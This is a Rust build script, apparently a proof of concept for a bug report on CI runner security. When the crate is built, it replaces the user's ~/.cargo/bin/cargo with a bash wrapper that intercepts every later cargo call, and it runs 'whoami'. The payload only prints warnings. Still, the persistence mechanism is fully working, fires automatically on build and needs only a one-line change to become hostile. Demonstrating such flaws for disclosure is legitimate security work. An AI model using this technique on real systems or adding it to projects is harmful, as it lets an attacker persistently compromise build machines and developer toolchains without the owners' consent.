// Safe runner-persistence PoC: wraps ~/.cargo/bin/cargo (reversible).
// Adds prominent WARNING lines so it’s unmistakable in logs.
// No secrets, no network, no destructive ops.

use std::{env, fs, io, path::PathBuf, process::Command};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn make_exec(p: &PathBuf) -> io::Result<()> {
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(p)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(p, perms)?;
    }
    Ok(())
}

fn main() {
    let home = env::var("HOME").unwrap_or_default();
    let cargo = PathBuf::from(format!("{home}/.cargo/bin/cargo"));
    let cargo_real = PathBuf::from(format!("{home}/.cargo/bin/cargo.real"));

    // Wrapper prints WARNING every time cargo runs, then execs the real cargo.
    let wrapper = r#"#!/usr/bin/env bash
# SAFE_RUNNER_PERSIST_POC_WRAPPER
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== invoking: cargo $* (safe PoC: no secrets, no network)" 1>&2
exec "$(dirname "$0")/cargo.real" "$@"
"#;

    if cargo.exists() && !cargo_real.exists() {
        if let Err(e) = fs::rename(&cargo, &cargo_real) {
            println!("cargo:warning=PoC: failed to move cargo -> cargo.real: {e}");
            return;
        }
        if let Err(e) = fs::write(&cargo, wrapper.as_bytes()) {
            println!("cargo:warning=PoC: failed to write wrapper: {e}");
            let _ = fs::rename(&cargo_real, &cargo);
            return;
        }
        let _ = make_exec(&cargo);
        let _ = make_exec(&cargo_real);

        println!("cargo:warning=WARNING: Installed cargo wrapper at ~/.cargo/bin/cargo");
        println!(
            "cargo:warning=WARNING: Non-ephemeral self-hosted runner persistence \
             demonstrated."
        );
        println!(
            "cargo:warning=WARNING: Every cargo invocation will print RUNNER_PERSIST_POC \
             until reverted."
        );
    } else if cargo_real.exists() {
        println!(
            "cargo:warning=WARNING: cargo already wrapped (cargo.real present) — PoC still \
             active."
        );
    } else {
        println!("cargo:warning=PoC: ~/.cargo/bin/cargo not found; nothing wrapped.");
    }

    // Small breadcrumb (safe)
    let _ = Command::new("sh")
        .arg("-lc")
        .arg("whoami; uname -a >/dev/null")
        .status();
}
